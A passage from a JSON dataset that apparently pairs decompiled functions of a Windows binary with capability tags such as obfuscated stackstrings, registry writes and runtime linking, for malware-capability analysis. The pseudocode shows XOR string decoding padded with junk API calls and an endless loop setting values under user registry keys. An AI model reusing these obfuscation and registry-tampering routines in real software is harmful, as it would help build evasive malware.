0x33;\n    var_eh._1_1_ = 0x14;\n    var_eh._2_1_ = 0x1d;\n    var_eh._3_1_ = 0x6e;\n    stack0xfffffff4 = 0x73567539;\n    var_4h._0_2_ = 0x6e78;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x13);\n    iVar19 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar20 = 0;\n    var_2ch = var_18h + (-4 - iVar19);\n    do {\n        iVar21 = (*pcVar1)();\n        if (iVar21 != 0x36e90b) {\n            *(iVar20 + iVar19) = *(&var_ah + iVar20 % var_34h + 2) ^ (iVar20 + iVar19)[var_2ch];\n        }\n        iVar20 = iVar20 + 1;\n    } while (iVar20 < 0x12);\n    fcn.00406483();\n    var_20h._0_1_ = 0x32;\n    var_20h._1_1_ = 1;\n    var_20h._2_1_ = 0x1b;\n    var_20h._3_1_ = 0x2f;\n    var_1ch._0_1_ = 0xd;\n    var_1ch._1_1_ = 2;\n    var_1ch._2_1_ = 0x25;\n    var_1ch._3_1_ = 0x2f;\n    var_18h[0] = 0x33;\n    var_18h[1] = 0xd;\n    var_16h._0_1_ = 0x15;\n    var_16h._1_1_ = 0x34;\n    var_16h._2_1_ = 0x3a;\n    var_16h._3_1_ = 0x3f;\n    var_12h._0_1_ = 0x15;\n    var_12h._1_1_ = 8;\n    var_12h._2_1_ = 8;\n    var_12h._3_1_ = 0x2d;\n    var_eh._0_1_ = 0x31;\n    var_eh._1_1_ = 6;\n    var_eh._2_1_ = 0x61;\n    var_70h = 0x56486461;\n    var_6ch._0_1_ = 99;\n    uVar3 = (*pcVar1)(8, 0x16);\n    iVar20 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar21 = 0;\n    var_2ch = &var_20h - iVar20;\n    do {\n        iVar22 = (*_sym.imp.USER32.dll_GetClipboardOwner)();\n        if (iVar22 != 0x8b148f) {\n            *(iVar21 + iVar20) = *(&var_70h + iVar21 % var_38h) ^ (iVar21 + iVar20)[&var_20h - iVar20];\n        }\n        iVar21 = iVar21 + 1;\n    } while (iVar21 < 0x15);\n    fcn.00406483();\n    var_24h._0_1_ = 6;\n    var_24h._1_1_ = 0x15;\n    var_24h._2_1_ = 0x11;\n    var_24h._3_1_ = 0x34;\n    var_20h._0_1_ = 0x12;\n    var_20h._1_1_ = 0x38;\n    var_20h._2_1_ = 0x39;\n    var_20h._3_1_ = 0x15;\n    var_1ch._0_1_ = 0x10;\n    var_1ch._1_1_ = 0x3f;\n    var_1ch._2_1_ = 0x1f;\n    var_1ch._3_1_ = 0x3f;\n    var_18h[0] = 0x32;\n    var_18h[1] = 0x11;\n    var_16h._0_1_ = 0x20;\n    var_16h._1_1_ = 0x33;\n    var_16h._2_1_ = 0x1c;\n    var_16h._3_1_ = 0x34;\n    var_12h._0_1_ = 5;\n    var_12h._1_1_ = 2;\n    var_12h._2_1_ = 0x3d;\n    var_12h._3_1_ = 0x2c;\n    var_eh._0_1_ = 0x1a;\n    var_eh._1_1_ = 0x36;\n    var_eh._2_1_ = 0x30;\n    var_eh._3_1_ = 0x17;\n    var_ah._0_1_ = 0x31;\n    var_ah._1_1_ = 0x5a;\n    stack0xfffffff4 = 0x5a547055;\n    var_4h._0_2_ = 0x5a73;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x1d);\n    iVar21 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar22 = 0;\n    var_70h = iVar21;\n    var_2ch = &var_24h - iVar21;\n    do {\n        iVar23 = (*_sym.imp.USER32.dll_GetMessageExtraInfo)();\n        if (iVar23 != 0x3d6ca0) {\n            *(iVar22 + iVar21) = *(&var_ah + iVar22 % var_34h + 2) ^ (iVar22 + iVar21)[&var_24h - iVar21];\n        }\n        iVar22 = iVar22 + 1;\n    } while (iVar22 < 0x1c);\n    fcn.00406483();\n    var_20h._0_1_ = 0x36;\n    var_20h._1_1_ = 0x28;\n    var_20h._2_1_ = 10;\n    var_20h._3_1_ = 0;\n    var_1ch._0_1_ = 0x26;\n    var_1ch._1_1_ = 3;\n    var_1ch._2_1_ = 2;\n    var_1ch._3_1_ = 0x28;\n    var_18h[0] = 0x11;\n    var_18h[1] = 0xe;\n    var_16h._0_1_ = 0x24;\n    var_16h._1_1_ = 0x17;\n    var_16h._2_1_ = 8;\n    var_16h._3_1_ = 0x28;\n    var_12h._0_1_ = 0x17;\n    var_12h._1_1_ = 0x13;\n    var_12h._2_1_ = 0x21;\n    var_12h._3_1_ = 0x14;\n    var_eh._0_1_ = 0xc;\n    var_eh._1_1_ = 0x21;\n    var_eh._2_1_ = 0x22;\n    var_eh._3_1_ = 6;\n    var_ah._0_1_ = 0x2d;\n    var_ah._1_1_ = 0x62;\n    stack0xfffffff4 = 0x61474d65;\n    var_4h._0_2_ = 0x6248;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x19);\n    iVar21 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar22 = 0;\n    var_2ch = &var_20h - iVar21;\n    do {\n        iVar23 = (*_sym.imp.KERNEL32.dll_GetLogicalDrives)();\n        if (iVar23 != 0x1e1c86) {\n            *(iVar22 + iVar21) = *(&var_ah + iVar22 % var_34h + 2) ^ (iVar22 + iVar21)[&var_20h - iVar21];\n        }\n        iVar22 = iVar22 + 1;\n    } while (iVar22 < 0x18);\n    fcn.00406483();\n    var_20h._0_1_ = 0x67;\n    var_20h._1_1_ = 0x2b;\n    var_20h._2_1_ = 0x70;\n    var_20h._3_1_ = 0x5b;\n    var_1ch._0_1_ = 8;\n    var_1ch._1_1_ = 0x24;\n    var_1ch._2_1_ = 0x46;\n    var_1ch._3_1_ = 0x3d;\n    var_18h[0] = 0x56;\n    var_18h[1] = 0x58;\n    var_16h._0_1_ = 0x19;\n    var_16h._1_1_ = 0x35;\n    var_16h._2_1_ = 0x51;\n    var_16h._3_1_ = 0x1e;\n    var_12h._0_1_ = 0x4b;\n    var_12h._1_1_ = 0x5f;\n    var_12h._2_1_ = 0xe;\n    var_12h._3_1_ = 0x28;\n    var_eh._0_1_ = 0x58;\n    var_eh._1_1_ = 0x2b;\n    var_eh._2_1_ = 0x5e;\n    var_eh._3_1_ = 0x53;\n    var_ah._0_1_ = 0x78;\n    stack0xfffffff4 = 0x36394e34;\n    var_4h._0_2_ = 0x4178;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x18);\n    iVar22 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar23 = 0;\n    var_2ch = &var_20h - iVar22;\n    do {\n        iVar24 = (*_sym.imp.KERNEL32.dll_GetCommandLineA)();\n        if (iVar24 != 0xa00783) {\n            *(iVar23 + iVar22) = *(&var_ah + iVar23 % var_34h + 2) ^ (iVar23 + iVar22)[&var_20h - iVar22];\n        }\n        iVar23 = iVar23 + 1;\n    } while (iVar23 < 0x17);\n    fcn.00406483();\n    var_20h._0_1_ = 0x24;\n    var_20h._1_1_ = 6;\n    var_20h._2_1_ = 0x17;\n    var_20h._3_1_ = 0x47;\n    var_1ch._0_1_ = 0x29;\n    var_1ch._1_1_ = 0x18;\n    var_1ch._2_1_ = 3;\n    var_18h[0] = 0x13;\n    var_18h[1] = 0x59;\n    var_16h._0_1_ = 0x23;\n    var_16h._1_1_ = 0x1b;\n    var_16h._2_1_ = 0x16;\n    var_16h._3_1_ = 0xf;\n    var_12h._0_1_ = 4;\n    var_12h._1_1_ = 0x47;\n    var_12h._2_1_ = 0x25;\n    var_12h._3_1_ = 0xf;\n    var_eh._0_1_ = 0x1e;\n    var_eh._1_1_ = 0xf;\n    var_eh._2_1_ = 0x31;\n    var_eh._3_1_ = 0x52;\n    var_ah._0_1_ = 0x29;\n    var_ah._1_1_ = 0x79;\n    stack0xfffffff4 = 0x35546377;\n    var_4h._0_2_ = 0x794c;\n    var_1ch._3_1_ = var_20h._1_1_;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x19);\n    iVar23 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar24 = 0;\n    var_2ch = &var_20h - iVar23;\n    do {\n        iVar25 = (*_sym.imp.USER32.dll_GetOpenClipboardWindow)();\n        if (iVar25 != 0x68b808) {\n            *(iVar24 + iVar23) = *(&var_ah + iVar24 % var_34h + 2) ^ (iVar24 + iVar23)[&var_20h - iVar23];\n        }\n        iVar24 = iVar24 + 1;\n    } while (iVar24 < 0x18);\n    fcn.00406483();\n    var_28h = 0x25232a;\n    var_24h._0_1_ = 0x33;\n    var_24h._1_1_ = 10;\n    var_24h._2_1_ = 0x32;\n    var_24h._3_1_ = 0x14;\n    var_20h._0_1_ = 0x16;\n    var_20h._1_1_ = 5;\n    var_20h._2_1_ = 0xb;\n    var_20h._3_1_ = 0x23;\n    var_1ch._0_1_ = 0x15;\n    var_1ch._1_1_ = 0x3f;\n    var_1ch._2_1_ = 0x27;\n    var_1ch._3_1_ = 0x17;\n    var_18h[0] = 7;\n    var_18h[1] = 0x12;\n    var_16h._0_1_ = 0x11;\n    var_16h._1_1_ = 0x23;\n    var_16h._2_1_ = 10;\n    var_16h._3_1_ = 0x35;\n    var_12h._0_1_ = 0x21;\n    var_12h._1_1_ = 0;\n    var_12h._2_1_ = 0x2f;\n    var_12h._3_1_ = 0xf;\n    var_eh._0_1_ = 0x2f;\n    var_eh._1_1_ = 0x1d;\n    var_eh._2_1_ = 0x17;\n    var_eh._3_1_ = 0x21;\n    var_ah._0_1_ = 0x1c;\n    var_ah._1_1_ = 0x46;\n    var_48h = 0x72714679;\n    var_44h._0_1_ = 0x46;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x21);\n    iVar24 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar25 = 0;\n    var_2ch = &var_28h - iVar24;\n    do {\n        iVar26 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        if (iVar26 != 0x2e7b8f) {\n            *(iVar25 + iVar24) = *(&var_48h + iVar25 % var_38h) ^ (iVar25 + iVar24)[&var_28h - iVar24];\n        }\n        iVar25 = iVar25 + 1;\n    } while (iVar25 < 0x20);\n    fcn.00406483();\n    var_1ch._0_1_ = 0x67;\n    var_1ch._1_1_ = 0x52;\n    var_1ch._2_1_ = 0x1b;\n    var_1ch._3_1_ = 0xb;\n    var_18h[0] = 3;\n    var_18h[1] = 0x55;\n    var_16h._0_1_ = 0x55;\n    var_16h._1_1_ = 0x2c;\n    var_16h._2_1_ = 2;\n    var_16h._3_1_ = 0x3f;\n    var_12h._0_1_ = 0x46;\n    var_12h._1_1_ = 0x5e;\n    var_12h._2_1_ = 0x3f;\n    var_12h._3_1_ = 7;\n    var_eh._0_1_ = 3;\n    var_eh._1_1_ = 0x51;\n    var_eh._2_1_ = 0x50;\n    var_eh._3_1_ = 0x2c;\n    var_ah._0_1_ = 0x6e;\n    var_40h = 0x6e493734;\n    var_3ch._0_1_ = 0x6f;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x14);\n    iVar25 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar26 = 0;\n    var_48h = iVar25;\n    var_2ch = var_18h + (-4 - iVar25);\n    do {\n        iVar27 = (*_sym.imp.USER32.dll_GetCapture)();\n        if (iVar27 != 0x96a7ff) {\n            *(iVar26 + iVar25) = *(&var_40h + iVar26 % var_38h) ^ (iVar26 + iVar25)[var_18h + (-4 - iVar25)];\n        }\n        iVar26 = iVar26 + 1;\n    } while (iVar26 < 0x13);\n    fcn.00406483();\n    var_28h = 0x57382865;\n    var_24h._0_1_ = 0x1a;\n    var_24h._1_1_ = 0x26;\n    var_24h._2_1_ = 0x53;\n    var_24h._3_1_ = 0x2c;\n    var_20h._0_1_ = 2;\n    var_20h._1_1_ = 0x5c;\n    var_20h._2_1_ = 0x2e;\n    var_20h._3_1_ = 0x3b;\n    var_1ch._0_1_ = 0x44;\n    var_1ch._1_1_ = 0x26;\n    var_1ch._2_1_ = 0x18;\n    var_1ch._3_1_ = 0x57;\n    var_18h[0] = 0x1e;\n    var_18h[1] = 7;\n    var_16h._0_1_ = 0x53;\n    var_16h._1_1_ = 0x39;\n    var_16h._2_1_ = 0x21;\n    var_16h._3_1_ = 0x4b;\n    var_12h._0_1_ = 0x10;\n    var_12h._1_1_ = 0x22;\n    var_12h._2_1_ = 0x5f;\n    var_12h._3_1_ = 0x21;\n    var_eh._0_1_ = 0x14;\n    var_eh._1_1_ = 0x5e;\n    var_eh._2_1_ = 0x1c;\n    var_eh._3_1_ = 0x54;\n    stack0xfffffff4 = 0x39714d36;\n    var_4h._0_2_ = 0x5479;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x1f);\n    iVar25 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar26 = 0;\n    var_40h = iVar25;\n    var_2ch = &var_28h - iVar25;\n    do {\n        iVar27 = (*_sym.imp.USER32.dll_GetClipboardSequenceNumber)();\n        if (iVar27 != 0xc29be6) {\n            *(iVar26 + iVar25) = *(&var_ah + iVar26 % var_34h + 2) ^ (iVar26 + iVar25)[&var_28h - iVar25];\n        }\n        iVar26 = iVar26 + 1;\n    } while (iVar26 < 0x1e);\n    fcn.00406483();\n    var_1ch._0_1_ = 0x15;\n    var_1ch._1_1_ = 0x5d;\n    var_1ch._2_1_ = 0x11;\n    var_1ch._3_1_ = 0x2d;\n    var_18h[0] = 0x1a;\n    var_18h[1] = 0x23;\n    var_16h._0_1_ = 0x62;\n    var_16h._1_1_ = 0x2a;\n    var_16h._2_1_ = 0x2a;\n    var_16h._3_1_ = 0x12;\n    var_12h._0_1_ = 0x16;\n    var_12h._1_1_ = 0x4a;\n    var_12h._2_1_ = 0x2c;\n    var_12h._3_1_ = 0x32;\n    var_eh._0_1_ = 0x1e;\n    var_eh._1_1_ = 0x2a;\n    var_eh._2_1_ = 0x5d;\n    var_eh._3_1_ = 0x22;\n    var_ah._0_1_ = 0x21;\n    var_ah._1_1_ = 0x77;\n    stack0xfffffff4 = 0x44453846;\n    var_4h._0_2_ = CONCAT11(var_4h._1_1_, 0x77);\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x15);\n    iVar25 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar26 = 0;\n    var_34h = iVar25;\n    var_2ch = var_18h + (-4 - iVar25);\n    do {\n        iVar27 = (*_sym.imp.USER32.dll_DestroyCaret)();\n        if (iVar27 != 0x4b484c) {\n            *(iVar26 + iVar25) = *(&var_ah + iVar26 % var_38h + 2) ^ (iVar26 + iVar25)[var_18h + (-4 - iVar25)];\n        }\n        iVar26 = iVar26 + 1;\n    } while (iVar26 < 0x14);\n    fcn.00406483();\n    var_28h = 0x473b0e21;\n    var_24h._0_1_ = 0x35;\n    var_24h._1_1_ = 0x13;\n    var_24h._2_1_ = 0x1f;\n    var_24h._3_1_ = 0x1d;\n    var_20h._0_1_ = 0x66;\n    var_20h._1_1_ = 0x29;\n    var_20h._2_1_ = 0x1f;\n    var_20h._3_1_ = 9;\n    var_1ch._0_1_ = 0x17;\n    var_1ch._1_1_ = 0x59;\n    var_1ch._2_1_ = 0x39;\n    var_1ch._3_1_ = 0x11;\n    var_18h[0] = 0x27;\n    var_18h[1] = 0x11;\n    var_16h._0_1_ = 0x5b;\n    var_16h._1_1_ = 0x3b;\n    var_16h._2_1_ = 0x22;\n    var_16h._3_1_ = 0x19;\n    var_12h._0_1_ = 0x11;\n    var_12h._1_1_ = 0x43;\n    var_12h._2_1_ = 0x39;\n    var_12h._3_1_ = 0x1e;\n    var_eh._0_1_ = 0xe;\n    var_eh._1_1_ = 0x1f;\n    var_eh._2_1_ = 0x50;\n    var_eh._3_1_ = 0x50;\n    stack0xfffffff4 = 0x35786b72;\n    var_4h._0_2_ = CONCAT11(var_4h._1_1_, 0x50);\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x1f);\n    iVar25 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar26 = 0;\n    var_2ch = &var_28h - iVar25;\n    do {\n        iVar27 = (*_sym.imp.USER32.dll_GetOpenClipboardWindow)();\n        if (iVar27 != 0x35a06b) {\n            *(iVar26 + iVar25) = *(&var_ah + iVar26 % var_38h + 2) ^ (iVar26 + iVar25)[&var_28h - iVar25];\n        }\n        iVar26 = iVar26 + 1;\n    } while (iVar26 < 0x1e);\n    fcn.00406483();\n    pcVar2 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar25);\n    pcVar1 = _sym.imp.KERNEL32.dll_HeapFree;\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n    uVar3 = (*pcVar2)(0, var_34h);\n    (*pcVar1)(uVar3);\n    uVar3 = (*pcVar2)(0, var_40h);\n    (*pcVar1)(uVar3);\n    uVar3 = (*pcVar2)(0, var_48h);\n    (*pcVar1)(uVar3);\n    uVar3 = (*pcVar2)(0, iVar24);\n    (*pcVar1)(uVar3);\n    uVar3 = (*pcVar2)(0, iVar23);\n    (*pcVar1)(uVar3);\n    uVar3 = (*pcVar2)(0, iVar22);\n    (*pcVar1)(uVar3);\n    uVar3 = (*pcVar2)(0, iVar21);\n    (*pcVar1)(uVar3);\n    uVar3 = (*pcVar2)(0, var_70h);\n    (*pcVar1)(uVar3);\n    uVar3 = (*pcVar2)(0, iVar20);\n    (*pcVar1)(uVar3);\n    uVar3 = (*pcVar2)(0, iVar19);\n    (*pcVar1)(uVar3);\n    uVar3 = (*pcVar2)(0, iVar18);\n    (*pcVar1)(uVar3);\n    uVar3 = (*pcVar2)(0, var_90h);\n    (*pcVar1)(uVar3);\n    uVar3 = (*pcVar2)(0, var_50h);\n    (*pcVar1)(uVar3);\n    uVar3 = (*pcVar2)(0, iVar17);\n    (*pcVar1)(uVar3);\n    uVar3 = (*pcVar2)(0, iVar16);\n    (*pcVar1)(uVar3);\n    uVar3 = (*pcVar2)(0, iVar15);\n    (*pcVar1)(uVar3);\n    uVar3 = (*pcVar2)(0, var_78h);\n    (*pcVar1)(uVar3);\n    uVar3 = (*pcVar2)(0, iVar14);\n    (*pcVar1)(uVar3);\n    uVar3 = (*pcVar2)(0, iVar13);\n    (*pcVar1)(uVar3);\n    uVar3 = (*pcVar2)(0, iVar12);\n    (*pcVar1)(uVar3);\n    uVar3 = (*pcVar2)(0, var_80h);\n    (*pcVar1)(uVar3);\n    uVar3 = (*pcVar2)(0, iVar11);\n    (*pcVar1)(uVar3);\n    uVar3 = (*pcVar2)(0, var_88h);\n    (*pcVar1)(uVar3);\n    uVar3 = (*pcVar2)(0, iVar10);\n    (*pcVar1)(uVar3);\n    uVar3 = (*pcVar2)(0, var_58h);\n    (*pcVar1)(uVar3);\n    uVar3 = (*pcVar2)(0, iVar9);\n    (*pcVar1)(uVar3);\n    uVar3 = (*pcVar2)(0, var_60h);\n    (*pcVar1)(uVar3);\n    uVar3 = (*pcVar2)(0, iVar8);\n    (*pcVar1)(uVar3);\n    uVar3 = (*pcVar2)(0, iVar7);\n    (*pcVar1)(uVar3);\n    uVar3 = (*pcVar2)(0, iVar6);\n    (*pcVar1)(uVar3);\n    uVar3 = (*pcVar2)(0, var_68h);\n    (*pcVar1)(uVar3);\n    uVar3 = (*pcVar2)(0, iVar5);\n    (*pcVar1)(uVar3);\n    uVar3 = (*pcVar2)(0, iVar28);\n    (*pcVar1)(uVar3);\n    uVar3 = (*pcVar2)(0, iVar4);\n    (*pcVar1)(uVar3);\n    return;\n}\n",
        "token_count": 21658
    },
    "0040ab19": {
        "rules": [
            "contain obfuscated stackstrings",
            "contain loop",
            "set registry value"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.0040ab19(void)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint *puVar6;\n    uint var_16ch;\n    int32_t var_68h;\n    int32_t var_64h;\n    uint var_60h;\n    uint var_5ch;\n    uchar var_58h;\n    uint var_57h;\n    uchar var_53h;\n    uchar var_52h;\n    uint var_51h;\n    uint var_4dh;\n    uint var_49h;\n    uchar var_45h;\n    uchar var_44h;\n    uint var_43h;\n    uint var_3fh;\n    uint var_3bh;\n    uint var_37h;\n    uint var_33h;\n    uchar var_2fh;\n    uchar var_2eh;\n    ushort var_2dh;\n    uchar var_2bh;\n    uint var_2ah;\n    uint var_26h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_60h = 0;\n    var_5ch = 0x4337183c;\n    var_57h._0_1_ = 0xe;\n    puVar6 = &var_16ch;\n    for (iVar4 = 0x104; iVar4 != 0; iVar4 = iVar4 + -1) {\n        *puVar6 = 0;\n        puVar6 = puVar6 + 1;\n    }\n    var_64h = 6;\n    var_58h = 6;\n    var_ch = 5;\n    var_57h._1_1_ = 5;\n    var_57h._2_2_ = 0x6b34;\n    var_53h = 0x3c;\n    var_51h = 0x2582314;\n    var_4dh = 0x6b251100;\n    var_49h._0_1_ = 0x26;\n    var_49h._2_2_ = 0x3519;\n    var_45h = 0x58;\n    var_43h = 0x42122b1c;\n    var_3fh = 0x3f121d03;\n    var_3bh._0_2_ = 0x2743;\n    var_3bh._2_1_ = 10;\n    var_37h = 0x11e5e22;\n    var_33h._0_2_ = 0x182b;\n    var_33h._2_1_ = 0x59;\n    var_2fh = 10;\n    var_2dh = 0x523f;\n    var_2ah = 0x4334244f;\n    stack0xffffffd8 = 0x2d443619;\n    var_20h = 0x523f1835;\n    var_1ch = 0x35523302;\n    var_18h._0_2_ = 0x716b;\n    var_8h = 0x3751776f;\n    var_4h._0_1_ = 0x71;\n    var_52h = var_58h;\n    var_49h._1_1_ = var_58h;\n    var_44h = var_58h;\n    var_3bh._3_1_ = var_57h._1_1_;\n    var_33h._3_1_ = var_57h._1_1_;\n    var_2eh = var_57h._1_1_;\n    var_2bh = var_57h._1_1_;\n    var_26h._0_1_ = var_57h._1_1_;\n    var_26h._1_1_ = var_58h;\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x47);\n    iVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n    iVar5 = 0;\n    var_68h = iVar4;\n    do {\n        iVar2 = (*_sym.imp.USER32.dll_GetProcessWindowStation)();\n        if (iVar2 != 0x3930fb) {\n            *(iVar5 + iVar4) = *(&var_8h + iVar5 % var_ch) ^ (iVar5 + iVar4)[&var_5ch - iVar4];\n        }\n        iVar5 = iVar5 + 1;\n    } while (iVar5 < 0x46);\n    var_8h = 0x57000160;\n    var_4h._0_1_ = 0x30;\n    var_14h = 0x67303452;\n    var_10h._0_2_ = 0x7730;\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 6);\n    iVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n    iVar5 = 0;\n    var_ch = &var_8h - iVar4;\n    do {\n        iVar3 = (*_sym.imp.KERNEL32.dll_GetModuleHandleW)(0);\n        iVar2 = var_68h;\n        if (iVar3 != 0x13e54e) {\n            *(iVar5 + iVar4) = *(&var_14h + iVar5 % var_64h) ^ (iVar5 + iVar4)[&var_8h - iVar4];\n        }\n        iVar5 = iVar5 + 1;\n    } while (iVar5 < 5);\n    do {\n        iVar5 = 0;\n        do {\n            var_ch = 0;\n            (*_sym.imp.USER32.dll_wsprintfA)(&var_16ch, iVar2, iVar5);\n            iVar3 = (*_sym.imp.ADVAPI32.dll_RegOpenKeyA)(0x80000001, &var_16ch, &var_ch);\n            if (iVar3 == 0) {\n                var_60h = 3;\n                (*_sym.imp.ADVAPI32.dll_RegSetValueExA)(var_ch, iVar4, 0, 4, &var_60h, 4);\n                (*_sym.imp.ADVAPI32.dll_RegCloseKey)(var_ch);\n            }\n            iVar5 = iVar5 + 1;\n        } while (iVar5 < 5);\n        (*_sym.imp.KERNEL32.dll_Sleep)(1000);\n    } while( true );\n}\n",
        "token_count": 1495
    },
    "0040af7d": {
        "rules": [
            "contain obfuscated stackstrings",
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuchar * fcn.0040af7d(void)\n\n{\n    code *pcVar1;\n    uchar *puVar2;\n    uint uVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint32_t uVar6;\n    uchar *puVar7;\n    int32_t iVar8;\n    uchar *puVar9;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uchar *var_10h;\n    uint var_ch;\n    int32_t var_8h;\n    uchar *var_4h;\n    \n    pcVar1 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    var_48h = 0x76185939;\n    var_44h = 0x7a3d580a;\n    var_40h = 0x593e6913;\n    var_3ch = 0x5801761d;\n    var_38h = 0x691c7a30;\n    var_34h = 0x76165933;\n    var_30h = 0x7a375804;\n    var_2ch = 0x59286919;\n    var_28h = 0x581b760b;\n    var_24h = 0x69027a2a;\n    var_20h = 0x760c592d;\n    var_1ch = 0x7a21581e;\n    var_18h = 0x5922690f;\n    var_14h._0_2_ = 0x767a;\n    var_10h = 0x767a5958;\n    var_ch._0_1_ = 0x69;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x6d);\n    iVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar8 = 0;\n    var_8h = &var_48h - iVar4;\n    do {\n        iVar5 = (*_sym.imp.KERNEL32.dll_GetModuleHandleW)(0);\n        if (iVar5 != 0xa5cfd3) {\n            var_4h = 0x5;\n            *(iVar8 + iVar4) = *(&var_10h + iVar8 % 5) ^ (iVar8 + iVar4)[var_8h];\n        }\n        iVar8 = iVar8 + 1;\n    } while (iVar8 < 0x36);\n    uVar6 = fcn.0040ae2a();\n    puVar7 = uVar6 % 0x38 + 8;\n    var_10h = puVar7;\n    if (puVar7 != NULL) {\n        var_8h = puVar7 * 2 + 2;\n        uVar3 = (*pcVar1)(8, var_8h);\n        puVar7 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n        puVar2 = var_10h;\n        if (puVar7 != NULL) {\n            var_4h = NULL;\n            puVar9 = puVar7;\n            for (iVar8 = var_8h; iVar8 != 0; iVar8 = iVar8 + -1) {\n                *puVar9 = 0;\n                puVar9 = puVar9 + 1;\n            }\n            if (var_10h != NULL) {\n                do {\n                    iVar8 = fcn.0040ae2a();\n                    *(puVar7 + var_4h * 2) = *(iVar4 + (iVar8 % 0x1a) * 2);\n                    var_4h = var_4h + 1;\n                } while (var_4h < puVar2);\n            }\n            *(puVar7 + puVar2 * 2) = 0;\n        }\n    }\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar4);\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n    return puVar7;\n}\n",
        "token_count": 983
    },
    "0040b126": {
        "rules": [
            "contain obfuscated stackstrings",
            "contain loop",
            "link function at runtime on Windows",
            "get disk information"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint32_t fcn.0040b126(void)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    uint uVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    code *pcVar8;\n    uint32_t uVar9;\n    uint32_t uVar10;\n    int32_t iVar11;\n    uint var_60h;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint32_t var_36h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_18h;\n    uint var_14h;\n    uint32_t var_10h;\n    int32_t lpLibFileName;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_60h = 0xf01faf00;\n    var_5ch = 0x505600;\n    var_58h = 0x8002700;\n    var_54h = 0xc2900;\n    var_50h = 0x56900;\n    var_4ch = 0x3ff00;\n    var_48h = 0x1c4200;\n    var_44h = 0x163e00;\n    var_10h = 0;\n    var_28h = 0x15723c16;\n    var_24h = 0x86a7621;\n    var_20h._0_1_ = 0x5d;\n    var_20h._1_1_ = 0x2b;\n    var_20h._2_1_ = 0x75;\n    var_18h = 0x47316c44;\n    var_14h._0_2_ = 0x4275;\n    uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xc);\n    iVar5 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar4);\n    iVar11 = 0;\n    var_8h = &var_28h - iVar5;\n    lpLibFileName = iVar5;\n    do {\n        iVar6 = (*_sym.imp.USER32.dll_GetCapture)();\n        if (iVar6 != 0x40cb16) {\n            var_4h = 6;\n            *(iVar11 + iVar5) = *(&var_18h + iVar11 % 6) ^ (iVar11 + iVar5)[var_8h];\n        }\n        iVar11 = iVar11 + 1;\n    } while (iVar11 < 0xb);\n    var_30h = 0x15104717;\n    var_2ch = 0x18573077;\n    var_4h = 5;\n    var_28h = 0x57115105;\n    var_24h = 0x2c510408;\n    var_20h._0_1_ = 